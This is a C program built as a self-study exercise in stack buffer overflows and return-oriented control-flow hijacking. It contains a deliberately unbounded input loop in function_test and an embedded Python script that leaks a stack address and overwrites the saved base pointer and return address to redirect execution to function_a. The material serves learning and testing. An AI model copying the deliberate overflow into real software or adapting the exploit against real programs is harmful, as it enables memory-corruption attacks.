/*
 * The point of this program is to try out return oriented programming.
 * function_test has no bounds checking when reading input in from the user,
 * which means the user can overflow the stack, and overwrite the return
 * address for function_test.
 * The aim is to overwrite the return position in such a manner that function_a
 * is called.
 *
 * To proove the stack protection works, use this compilation command
 * vimcmd: !gcc -fstack-protector -o %:r %
 *
 * To do this, compile this file with
 * vimcmd: !gcc -o %:r %
 *
 * create a python file containing the code below
 * vimcmd: +1;/^ \* /-1 w! scripted.py
#!/usr/bin/env python
'''
Script to run a program that is vulnerable to a stack smashing attack.

This script is based on prior knowledge of the test program, and as such is
pretty useless without a specific one.

It parses the output of the program to find the memory address of a given
variable.
From this variable, it finds the base pointer of a known frame.
This base pointer is used in a buffer overrun, creating a clean switch into
another function.

'''
import struct
import sys
import os
import subprocess as sp
import fcntl
import time
import argparse

# Don't bother with argument checking -- this is just a play script
progname = sys.argv[1]

# As the output of "progname" is not a terminal, it buffers.
# We don't want this, we want our data as soon as it's ready.
# Here use the "stdbuf" command to do this, we could use unbuffer instead.
# ASIDE: unbuffer(1) is a small expect script that could be used instead.
#        it works by connecting to the command via pseudoterminal, which means
#        the command has the default line buffering instead of the block
#        buffering active when not attached to a pty.
#        script(1) has a similar functionality to unbuffer with the -c flag
#        stdbuf(1) works differently, it changes the functionality of stdio, by
#        using the LD_PRELOAD trick to run before the command and call
#        setvbuf(3) in a constructor.
child = sp.Popen(['stdbuf', '--output=0',  progname], stdin=sp.PIPE, stdout=sp.PIPE)

child_output = child.stdout.readline()
print(child_output)

myvalue = child_output.split()[-1]
print(myvalue)

# Open the subprocess' input in a binary format
out = os.fdopen(child.stdin.fileno(), 'wb')

# Skip the character in our array, then the 'next_value' temporary integer.
# Finally change the 'position' variable to skip straight to the new base
# pointer.
out.write(struct.pack('=BIB', 0, 0, 13))

# Convert the address given to us by the position of 'message' into the
# position that 'transitional_function' will have its base pointer at.
message_address = int(myvalue, 16)
base_pointer = message_address + 0xf0
# Then send this value to the subprocess.
out.write(struct.pack('L', base_pointer))

# Finally, give the subprocess the return address we want
# (i.e. function_a + 45)
out.write(struct.pack('L', 0x0000000000400613))

out.flush()
out.close()

child.wait()
print(child.stdout.read())
 * 
 * make it executable, then run it
 * vimcmd: !chmod u+x scripted.py
 * vimcmd: !./scripted.py ./%:r
 * 
 *
 * vimcmd: !rm ./scripted.py ./%:r
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

 /*
  * This function has an if clause and local parameter so the compiler gives it
  * a stack frame.
  * If the compiler doesn't give it a stack frame, then there's no "leave"
  * instruction, and I can't tell it to go back to the main function for a
  * clean exit.
  *
  * Specifically:
  *     Without this test, the entry to this function is
  *         0x0000000000400596 <+0>:	push   %rbp
  *         0x0000000000400597 <+1>:	mov    %rsp,%rbp
  *     As the compiler knows that %rsp is the same as %rbp, when the function
  *     exists, rather than use "leave", it uses
  *         0x00000000004005a5 <+15>:	pop    %rbp
  *         0x00000000004005a6 <+16>:	retq
  *     This means the stack pointer is not changed.
  *     In order to put the stack pointer back where it should be when we exit
  *     to the main function, we need the "leave" instruction.
  *     We have control over the value of %rbp, from the original stack
  *     smashing attack in function_test().
  *     Hence, given a "leave" instruction, we have control over %rsp once we
  *     get to main().
  */
void
function_a(void)
{
    char other_array[4];
    if (errno != 0) {
        other_array[3] = 0;
        printf("other_array random characters are: %s\n", other_array);
    }
    printf("We are in function a\n");
    return;
}


void
function_test(void)
{
    char small_array[1];
    printf("We are in function test\n");

    size_t position = 0;
    int next_value;
    while ((next_value = getchar()) != EOF) {
        small_array[position++] = (char) next_value;
    }

    printf("First character of small_array: %c\n", small_array[0]);

    return;
}

void
transitional_function(void)
{
    /* NOTE -- I had this message in at the start as it was nice to have a
     * large buffer on the stack when I didn't know exactly what instructions I
     * needed to write.
     * i.e. the message provided some space for my stack smashing in case I
     * needed to write a lot of information there.
     * It turns out that you don't need a lot of information, so this message
     * isn't needed, but I've hardcoded its size into the python script above,
     * so I'm not changing it. */
    char message[] = "This function is simply here to provide some stack space"
        " for function_a to play with."
        " That way, if I mess up the original function, I don't mess"
        " up main functions call stack. I don't really think it matters, but"
        " just in case...    ";
    if (errno != 0)
        puts(message);
    else
        printf("Position of message: %p\n", message);

    function_test();
    puts("finished transitional_function");

    return;
}


int
main()
{
    transitional_function();
    return 0;
}
